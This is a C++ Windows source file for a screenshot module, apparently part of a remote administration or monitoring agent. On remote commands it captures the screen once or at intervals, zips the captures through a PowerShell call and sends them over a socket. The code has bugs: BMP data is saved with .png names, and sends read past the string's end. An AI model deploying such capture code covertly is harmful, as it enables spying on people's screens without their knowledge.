#include "screenshot_thread.h"

// Function to save a bitmap to a file
void ScreenshotThread::saveBitmapToFile(HBITMAP hBitmap, const char* filename) {
    // Get the bitmap information
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    // Create the bitmap file header
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;

    // Fill the bitmap file header
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 24;  // Use 24 bits for RGB
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    // Calculate the size of the bitmap
    DWORD dwBmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;
    char* lpBitmap = new char[dwBmpSize];


    // Create a device context
    HDC hDC = CreateCompatibleDC(NULL);
    HGDIOBJ oldBitmap = SelectObject(hDC, hBitmap);

    // Get the bitmap data
    GetDIBits(hDC, hBitmap, 0, bmp.bmHeight, lpBitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);


    // Create the .BMP file
    ofstream file(filename, ios::binary);
    if (file) {
        // Fill the bitmap file header
        bmfHeader.bfType = 0x4D42; // BM
        bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
        bmfHeader.bfReserved1 = 0;
        bmfHeader.bfReserved2 = 0;
        bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

        // Write the bitmap file header
        file.write((const char*)&bmfHeader, sizeof(BITMAPFILEHEADER));
        file.write((const char*)&bi, sizeof(BITMAPINFOHEADER));
        file.write(lpBitmap, dwBmpSize); // Write the bitmap data

        // Close the file
        file.close();
    }


    // Cleanup
    delete[] lpBitmap;
    SelectObject(hDC, oldBitmap);
    DeleteDC(hDC);
}

// Function to capture a screenshot of the entire screen
void ScreenshotThread::capture(const char* filename) {
    // Enable DPI awareness
    SetProcessDPIAware();

    // Get the primary monitor handle
    HMONITOR hMonitor = MonitorFromPoint(POINT{ 0, 0 }, MONITOR_DEFAULTTOPRIMARY);
    MONITORINFOEX monitorInfo;
    monitorInfo.cbSize = sizeof(MONITORINFOEX);
    GetMonitorInfo(hMonitor, &monitorInfo);

    // Get the true screen dimensions from the monitor info
    int width = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
    int height = monitorInfo.rcMonitor.bottom - monitorInfo.rcMonitor.top;

    // Get the device context of the entire screen
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    // Create a bitmap to hold the screenshot
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    HGDIOBJ oldBitmap = SelectObject(hMemoryDC, hBitmap);

    // Copy the screen to the bitmap
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC,
        monitorInfo.rcMonitor.left, monitorInfo.rcMonitor.top, SRCCOPY);

    // Save the bitmap to a file
    saveBitmapToFile(hBitmap, filename);

    // Cleanup
    SelectObject(hMemoryDC, oldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
}

// Function to send a file to the client
void ScreenshotThread::sendSingleFile(const char* filename) {
    // Capture a screenshot of the entire screen
    log("Capturing screenshot");
    capture(filename);
    log("Screenshot captured successfully", SUCCESS_LOG);

    // Send a message to the client to indicate that the screenshot is being sent
    json response = {
        {"cmd", "screenshot"},
        {"body", {
            {"status", "sending"},
            {"filename", string(filename)},
            {"path", get_file_path(filename)},
            {"bytes", get_file_size(filename)},
        }}
    };

    string responseString = response.dump();
    memset(buffer, 0, BUFFER_SIZE);

    log("Sending response: " + responseString);

    if (server_socket == INVALID_SOCKET) {
        log("Invalid socket", ERROR_LOG);
        return;
    }

    send(server_socket, responseString.c_str(), BUFFER_SIZE, 0);

    sendFile(filename, server_socket);

	log("Screenshot sent successfully", SUCCESS_LOG);
}

// Function to take screenshot and save it to a file
void ScreenshotThread::captureAndSave() {
    if (folder_name.empty()) {
        folder_name = "screenshots_" + get_current_time();

        if (_mkdir(folder_name.c_str()) == -1) {
			log("Error creating folder", ERROR_LOG);
            return;
        }
    }

    string filename = folder_name + "/" + get_current_time() + ".png";
    capture(filename.c_str());

	log("Screenshot saved to: " + filename, SUCCESS_LOG);
}

// Compress the folder containing the screenshots and send it to the client
void ScreenshotThread::compressAndSend() {
    string zip_filename = folder_name + ".zip";
    string command = "powershell Compress-Archive -Path " + folder_name + " -DestinationPath " + zip_filename;
    system(command.c_str());

    log("Screenshots compressed to: " + zip_filename, SUCCESS_LOG);

    // Send a message to the client to indicate that the screenshots are being sent
    json response = {
        {"cmd", "screenshotitv"},
        {"body", {
            {"status", "stopped"},
            {"filename", zip_filename},
            {"path", get_file_path(zip_filename.c_str())},
            {"bytes", get_file_size(zip_filename.c_str())},
        }}
    };

    string responseString = response.dump();
    memset(buffer, 0, BUFFER_SIZE);
    send(server_socket, responseString.c_str(), BUFFER_SIZE, 0);

    sendFile(zip_filename, server_socket);

	log("Screenshots sent successfully", SUCCESS_LOG);
}

void ScreenshotThread::workerThread() {
    // Send response to the client that the screenshot thread has started
    string zip_filename = folder_name + ".zip";

    json response = {
        {"cmd", "screenshotitv"},
        {"body", {
            {"status", "started"},
            {"filename", zip_filename}
        }}
    };

    string responseString = response.dump();
    send(server_socket, responseString.c_str(), BUFFER_SIZE, 0);

    auto start_time = chrono::system_clock::now();
    while (screenshot_running) {
        auto end_time = chrono::system_clock::now();
        auto duration = chrono::duration_cast<chrono::seconds>(end_time - start_time);

        // If the duration is greater than the interval, take a screenshot
        if (duration.count() >= interval) {
            captureAndSave();

            // Reset the start time
            start_time = chrono::system_clock::now();
        }

        // Sleep for 100 milliseconds to avoid high CPU usage
        this_thread::sleep_for(chrono::milliseconds(100));
    }

    compressAndSend();
}

void ScreenshotThread::setInterval(int interval) {
    this->interval = interval;
}

void ScreenshotThread::start(const string& type) {
    if (type == "single") {
        string filename = get_current_time() + ".png";
        sendSingleFile(filename.c_str());
    }
    else {
        // If the thread is already running, dont start another one
        if (screenshot_running) {
            log("Screenshot thread already running", WARNING_LOG);
        }
        else {
            screenshot_running = true;
            worker = thread(&ScreenshotThread::workerThread, this);
        }
    }
}

void ScreenshotThread::stop() {
    screenshot_running = false;
    worker.join();
    folder_name = "";
}